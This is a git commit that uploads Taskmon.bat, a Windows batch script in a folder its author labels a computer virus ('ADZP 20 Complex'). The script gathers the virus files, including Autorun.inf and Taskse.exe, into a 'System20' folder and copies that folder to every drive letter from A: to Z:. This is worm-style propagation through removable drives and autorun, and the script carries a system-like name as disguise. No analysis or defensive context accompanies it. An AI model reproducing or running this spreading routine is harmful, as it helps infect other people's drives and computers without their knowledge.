8f83e703d31e43c82770d53d7079262bcf9fd977
DharkonSK <121519654+DharkonSK@users.noreply.github.com>
2023-12-17 18:32:24 -0600

    Add files via upload

---
+++ ADZP 20 Complex (Computer Virus)/Taskmon.bat
@@ -0,0 +1,63 @@
+@Echo off
+
+Md "System20"
+
+Copy "Shingapi.sk" "System20"
+
+Copy "ADZP 20 Complex.*" "System20"
+
+If exist "Autorun.inf" (Copy "Autorun.inf" "System20" & Copy "Taskse.exe" "System20")
+
+Copy System20 A:
+
+Copy System20 B:
+
+Copy System20 D:
+
+Copy System20 E:
+
+Copy System20 F:
+
+Copy System20 G:
+
+Copy System20 H:
+
+Copy System20 I:
+
+Copy System20 J:
+
+Copy System20 K:
+
+Copy System20 L:
+
+Copy System20 M:
+
+Copy System20 N:
+
+Copy System20 Ñ:
+
+Copy System20 O:
+
+Copy System20 P:
+
+Copy System20 Q:
+
+Copy System20 R:
+
+Copy System20 S:
+
+Copy System20 T:
+
+Copy System20 U:
+
+Copy System20 V:
+
+Copy System20 W:
+
+Copy System20 X:
+
+Copy System20 Y:
+
+Copy System20 Z:
+
+Exit
